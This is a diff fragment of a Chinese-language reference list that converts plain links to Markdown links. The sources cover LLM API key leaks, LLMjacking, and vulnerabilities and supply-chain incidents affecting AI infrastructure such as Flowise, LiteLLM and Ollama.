-- ModelPointer《企业为什么不能把大模型 API Key 直接发给业务系统？》：https://developer.aliyun.com/article/1757953
-- API 易《如何安全地管理 API Key》：https://docs.apiyi.com/faq/key-security-management
-- 绿盟科技创新研究院《LLM 数据泄露风险研究系列（三）：基于 LLM 应用的攻击面分析》：https://puming.zone/post/2025-04-28-llm数据泄露风险研究系列三基于llm应用的攻击面分析-copy/
-- OpenAI 官方《API 密钥安全最佳实践》：https://help.openai.com/zh-hans-cn/articles/5112595-best-practices-for-api-key-safety
-- Criminal IP 公开资产中的 AI API 令牌：https://www.criminalip.io/knowledge-hub/blog/35868
-- FreeBuf 秘钥守望者项目：https://m.freebuf.com/news/496637.html
-- LLMKeyLens iOS 应用凭据研究：https://cyberinsider.com/hundreds-of-iphone-apps-found-leaking-openai-gemini-credentials/
-- Agent 推理痕迹泄露研究（62 个 API Key）：https://www.aigovernance.com/news/frontier-api-reasoning-traces-leaked-62-live-api-keys-in-public-agent-logs
+- Intezer / Unit 42《How attackers are gaining access to LLM inference》：[https://mp.weixin.qq.com/s/i8Es0ozycTpmDWtVydXaeA](https://mp.weixin.qq.com/s/i8Es0ozycTpmDWtVydXaeA)
+- KB Agent《环境变量里的 Key》防御实践：[https://mp.weixin.qq.com/s/93RFPf1ye9hij_paKylg8g](https://mp.weixin.qq.com/s/93RFPf1ye9hij_paKylg8g)
+- 信安笔录《Agent 系统打点实录》：[https://mp.weixin.qq.com/s/zo7vkvlvh6H_SvATtS5c4g](https://mp.weixin.qq.com/s/zo7vkvlvh6H_SvATtS5c4g)
+- Wiz《Inside 90 days of attacks on AI infrastructure》：[https://www.wiz.io/blog/ai-infrastructure-honeypot](https://www.wiz.io/blog/ai-infrastructure-honeypot)
+- Wiz Probllama（CVE-2024-37032）：[https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
+- Sysdig《LLMjacking evolved》：[https://www.sysdig.com/blog/llmjacking-evolved-attackers-are-using-stolen-ai-compute-to-build-offensive-agentic-tools](https://www.sysdig.com/blog/llmjacking-evolved-attackers-are-using-stolen-ai-compute-to-build-offensive-agentic-tools)
+- CSA Flowise CVE-2025-59528 研究笔记：[https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/04/CSA_research_note_flowise_cve_2025_59528_active_exploitation_20260407-csa-styled.pdf](https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/04/CSA_research_note_flowise_cve_2025_59528_active_exploitation_20260407-csa-styled.pdf)
+- Flowise GHSA-6pcv-j4jx-m4vx：[https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6pcv-j4jx-m4vx](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6pcv-j4jx-m4vx)
+- SentinelOne CVE-2026-41279：[https://www.sentinelone.com/vulnerability-database/cve-2026-41279/](https://www.sentinelone.com/vulnerability-database/cve-2026-41279/)
+- VulnCheck CVE-2026-56268：[https://www.vulncheck.com/advisories/flowise-cross-workspace-information-disclosure-via-chatflows-apikey-endpoint](https://www.vulncheck.com/advisories/flowise-cross-workspace-information-disclosure-via-chatflows-apikey-endpoint)
+- CloudSEK / Hudson Rock LiteLLM 供应链（2,500 组织）：[https://thehackernews.com/2026/08/malicious-litellm-releases-tied-to.html](https://thehackernews.com/2026/08/malicious-litellm-releases-tied-to.html)
+- One API issue #2410 / #2423 / #2425：[https://github.com/songquanpeng/one-api/issues/2410](https://github.com/songquanpeng/one-api/issues/2410)
+- Wiz《State of AI in the Cloud 2026》：[https://www.wiz.io/reports/state-of-ai-in-the-cloud-2026](https://www.wiz.io/reports/state-of-ai-in-the-cloud-2026)
+- agentleaks（AI CLI 密钥路径清单）：[https://github.com/Thomas-E-Lewis/agentleaks](https://github.com/Thomas-E-Lewis/agentleaks)
+- SentinelLabs / Censys 175k Ollama：[https://thehackernews.com/2026/01/researchers-find-175000-publicly.html](https://thehackernews.com/2026/01/researchers-find-175000-publicly.html)
+- JetBrains 恶意插件：[https://vpncentral.com/malicious-jetbrains-plugins-stole-openai-deepseek-and-siliconflow-api-keys/](https://vpncentral.com/malicious-jetbrains-plugins-stole-openai-deepseek-and-siliconflow-api-keys/)
+- Wiz Moltbook 数据库暴露（150 万 API Key）：[https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys](https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys)
+- Wiz DeepSeek ClickHouse 暴露：[https://cybernoz.com/wiz-research-uncovers-exposed-deepseek-database-leaking-sensitive-information-including-chat-history/](https://cybernoz.com/wiz-research-uncovers-exposed-deepseek-database-leaking-sensitive-information-including-chat-history/)
+- CloudSEK Android 硬编码 Gemini Key（5 亿安装量级）：[https://www.pointguardai.com/ai-security-incidents/hardcoded-android-keys-opened-gemini-to-anyone-on-the-wire](https://www.pointguardai.com/ai-security-incidents/hardcoded-android-keys-opened-gemini-to-anyone-on-the-wire)
+- Akamai Ollama P2P 挖矿与远控取证：[https://www.akamai.com/blog/security-research/stealthy-p2p-cryptominer-ollama-endpoints](https://www.akamai.com/blog/security-research/stealthy-p2p-cryptominer-ollama-endpoints)
+- 奇安信 XLab NadMesh 僵尸网络（3,811 个 AWS Key）：[https://intelligibberish.com/articles/2026-07-19-nadmesh-botnet-exposed-ai-services-cloud-keys/](https://intelligibberish.com/articles/2026-07-19-nadmesh-botnet-exposed-ai-services-cloud-keys/)
+- Pillar Security Operation Bizarre Bazaar（35,000 攻击会话）：[https://www.pillar.security/blog/operation-bizarre-bazaar-first-attributed-llmjacking-campaign-with-commercial-marketplace-monetization](https://www.pillar.security/blog/operation-bizarre-bazaar-first-attributed-llmjacking-campaign-with-commercial-marketplace-monetization)
+- CSA《LiteLLM CVE-2026-42208：AI 代理预认证 SQL 注入》（36 小时在野利用、17 个 UNION 载荷、三张凭据表）：[https://labs.cloudsecurityalliance.org/research/csa-research-note-litellm-cve-2026-42208-ai-proxy-sqli-20260/](https://labs.cloudsecurityalliance.org/research/csa-research-note-litellm-cve-2026-42208-ai-proxy-sqli-20260/)
+- CSA《LLMjacking：AI 模型劫持达到黑市规模》（Sysdig 日账单数据聚合）：[https://labs.cloudsecurityalliance.org/research/csa-research-note-llmjacking-black-market-ai-model-hijacking/](https://labs.cloudsecurityalliance.org/research/csa-research-note-llmjacking-black-market-ai-model-hijacking/)
+- GitHub 秘密暴露规模（2024 年 3,900 万个、新提交 Key 平均 4 分钟被发现）：[https://beyondscale.tech/blog/llmjacking-defense-guide](https://beyondscale.tech/blog/llmjacking-defense-guide)
+- GitGuardian《State of Secrets Sprawl 2026》（2,865 万新秘密、AI 服务凭据 +81%、MCP 配置 24,008 个秘密、64% 未撤销、Shai-Hulud 2 数据集 6,943 台机器）：[https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/](https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/)
+- Verizon《2026 数据泄露调查报告》（DBIR，AI 使用率 15%→45%、67% 个人账号、Shadow AI 第三位）：[https://www.verizon.com/business/resources/reports/dbir/](https://www.verizon.com/business/resources/reports/dbir/)
+- GitGuardian 对 Verizon 2026 DBIR 的凭据视角解读（Shadow AI、非人类身份、第三方涉及占比 48%）：[https://blog.gitguardian.com/initial-access-changed-the-attack-path-did-not-findinds-from-the-verizon-2026-dbir/](https://blog.gitguardian.com/initial-access-changed-the-attack-path-did-not-findinds-from-the-verizon-2026-dbir/)
+- Google Cloud《Cloud Threat Horizons H1 2026》（身份失陷 83%、被盗凭据 21%、披露到利用压缩到天级）：[https://services.google.com/fh/files/misc/cloud_threat_horizons_report_h12026.pdf](https://services.google.com/fh/files/misc/cloud_threat_horizons_report_h12026.pdf)
+- ELLIS 研究所/马普所《Stealing Reasoning Traces from Proprietary LLM APIs》（arXiv:2608.09867）：[https://arxiv.org/abs/2608.09867](https://arxiv.org/abs/2608.09867)
+- Matthew Green《Fooling Around with Encrypted Reasoning Blobs》（2026-05-29 早期披露）：[https://blog.cryptographyengineering.com/2026/05/29/fooling-around-with-encrypted-reasoning-blobs/](https://blog.cryptographyengineering.com/2026/05/29/fooling-around-with-encrypted-reasoning-blobs/)
+- Cyble / Vicarius 8,000+ ChatGPT Key 暴露统计：[https://www.elegantsoftwaresolutions.com/blog/vibe-coder-security-2026-06-05](https://www.elegantsoftwaresolutions.com/blog/vibe-coder-security-2026-06-05)
+- 阿里人工智能治理研究中心《Agent 资源劫持攻击》：[https://hub.baai.ac.cn/view/57527](https://hub.baai.ac.cn/view/57527)
+- Beyond Direct Access: Resource Hijacking in LLM Agents（arXiv 2608.15108）：[https://arxiv.org/pdf/2608.15108](https://arxiv.org/pdf/2608.15108)
+- 腾讯云开发者社区《DeepSeek API Key 泄露一夜烧掉 5000 块》：[https://developer.cloud.tencent.com/article/2716630](https://developer.cloud.tencent.com/article/2716630)
+- 阿里云开发者社区《单日异常消耗 3.2 万美金：AI 调用治理复盘》：[https://developer.aliyun.com/article/1738003](https://developer.aliyun.com/article/1738003)
+- 火山引擎《GitHub 公开仓库 API Key 泄露遭滥用，是否属平台安全漏洞》：[https://www.volcengine.com/article/271095](https://www.volcengine.com/article/271095)
+- Ant Design X 文档密钥泄露 issue #831：[https://github.com/ant-design/x/issues/831](https://github.com/ant-design/x/issues/831)
+- 中国电信云堤·广目《大模型软件公网暴露测绘报告》：[https://zhuanlan.zhihu.com/p/1890065256010727983](https://zhuanlan.zhihu.com/p/1890065256010727983)
+- AveMujica《当 AI 功能进入真实业务：防止生产环境大模型 API Key 泄露》：[https://api.avemujica.moe/blog/zh/prevent-llm-api-key-leaks](https://api.avemujica.moe/blog/zh/prevent-llm-api-key-leaks)
+- CloudSEK AIVigil《无认证 MCP 服务器到 AWS 凭据窃取的完整链》：[https://www.cloudsek.com/blog/aivigil-mcp-security-case-study](https://www.cloudsek.com/blog/aivigil-mcp-security-case-study)
+- 假 Claude Code 安装器钓鱼战役（Google Sites × 32）：[https://dailysecurityreview.com/phishing/fake-claude-code-installers-on-google-sites-steal-ai-api-keys/](https://dailysecurityreview.com/phishing/fake-claude-code-installers-on-google-sites-steal-ai-api-keys/)
+- Slopsquatting（AI 幻觉包名抢注）：[https://shshell.com/blog/slopsquatting-ai-supply-chain-attack](https://shshell.com/blog/slopsquatting-ai-supply-chain-attack)
+- CSA《Mini Shai-Hulud：TeamPCP 多生态包注册表协同攻击》：[https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/05/CSA_research_note_teampcp_mini_shai_hulud_package_registry_wave_20260502-csa-styled.pdf](https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/05/CSA_research_note_teampcp_mini_shai_hulud_package_registry_wave_20260502-csa-styled.pdf)
+- MCP 生态安全状态统计（暴露的 Anthropic Key 与聊天记录）：[https://nimblebrain.ai/blog/state-of-mcp-security-2026/](https://nimblebrain.ai/blog/state-of-mcp-security-2026/)
+- OpenClaw 第三方客户端 150 万 API Key 泄露：[https://mcp.csdn.net/6a7c250f662f9a54cb9b9a42.html](https://mcp.csdn.net/6a7c250f662f9a54cb9b9a42.html)
+- MCP 服务器 URL 拼接类 token 泄露缺陷：[https://dev.to/correctover/an-mcp-server-leaked-api-tokens-through-url-concatenation-heres-the-class-of-bug-behind-it-4p76](https://dev.to/correctover/an-mcp-server-leaked-api-tokens-through-url-concatenation-heres-the-class-of-bug-behind-it-4p76)
+- ModelPointer《企业为什么不能把大模型 API Key 直接发给业务系统？》：[https://developer.aliyun.com/article/1757953](https://developer.aliyun.com/article/1757953)
+- API 易《如何安全地管理 API Key》：[https://docs.apiyi.com/faq/key-security-management](https://docs.apiyi.com/faq/key-security-management)
+- 绿盟科技创新研究院《LLM 数据泄露风险研究系列（三）：基于 LLM 应用的攻击面分析》：[https://puming.zone/post/2025-04-28-llm数据泄露风险研究系列三基于llm应用的攻击面分析-copy/](https://puming.zone/post/2025-04-28-llm数据泄露风险研究系列三基于llm应用的攻击面分析-copy/)
+- OpenAI 官方《API 密钥安全最佳实践》：[https://help.openai.com/zh-hans-cn/articles/5112595-best-practices-for-api-key-safety](https://help.openai.com/zh-hans-cn/articles/5112595-best-practices-for-api-key-safety)
+- Criminal IP 公开资产中的 AI API 令牌：[https://www.criminalip.io/knowledge-hub/blog/35868](https://www.criminalip.io/knowledge-hub/blog/35868)
+- FreeBuf 秘钥守望者项目：[https://m.freebuf.com/news/496637.html](https://m.freebuf.com/news/496637.html)
+- LLMKeyLens iOS 应用凭据研究：[https://cyberinsider.com/hundreds-of-iphone-apps-found-leaking-openai-gemini-credentials/](https://cyberinsider.com/hundreds-of-iphone-apps-found-leaking-openai-gemini-credentials/)
+- Agent 推理痕迹泄露研究（62 个 API Key）：[https://www.aigovernance.com/news/frontier-api-reasoning-traces-leaked-62-live-api-keys-in-public-agent-logs](https://www.aigovernance.com/news/frontier-api-reasoning-traces-leaked-62-live-api-keys-in-public-agent-logs)
